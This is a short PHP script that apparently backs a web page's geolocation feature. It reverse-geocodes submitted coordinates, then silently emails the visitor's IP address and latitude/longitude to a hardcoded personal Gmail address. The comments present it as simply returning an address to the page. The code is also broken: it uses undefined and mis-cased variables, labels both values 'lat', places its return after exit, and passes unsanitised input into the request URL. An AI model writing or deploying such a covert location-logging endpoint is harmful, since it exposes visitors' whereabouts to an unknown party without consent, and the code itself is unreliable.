<?php
//if latitude and longitude are submitted
if(!empty($_POST['latitude']) && !empty($_POST['longitude'])){
    //send request and receive json data by latitude and longitude
    $url = 'http://maps.googleapis.com/maps/api/geocode/json?latlng='.trim($_POST['latitude']).','.trim($_POST['longitude']).'&sensor=false';
    $json = @file_get_contents($url);
    $data = json_decode($json);
    $status = $data->status;
    
    //if request status is successful
    if($status == "OK"){
        //get address from json data
        $location = $data->results[0]->formatted_address;
    }else{
        $location =  '';
    }
    $msg.="IPaddress: ".$IPaddress;
$msg.='lat: ' . $Latitude . '<br />';
$msg.='lat: ' . $Longitude . '<br />';


$headers = "From: soumyachidambara@gmail.com\r\n";
$headers .= "Reply-To: shishirpatil007@gmail.com\r\n";
$headers .= "Return-Path: soumyachidambara@gmail.com\r\n";

$to="shishirpatil007@gmail.com";
$subject="Location";

if ( mail($to,$subject,$msg,$headers) ) {
   echo "The email has been sent!";
   } else {
   echo "The email has failed!";
   }



echo json_encode($msg);
exit;
    //return address to ajax 
    echo $location;
}
?>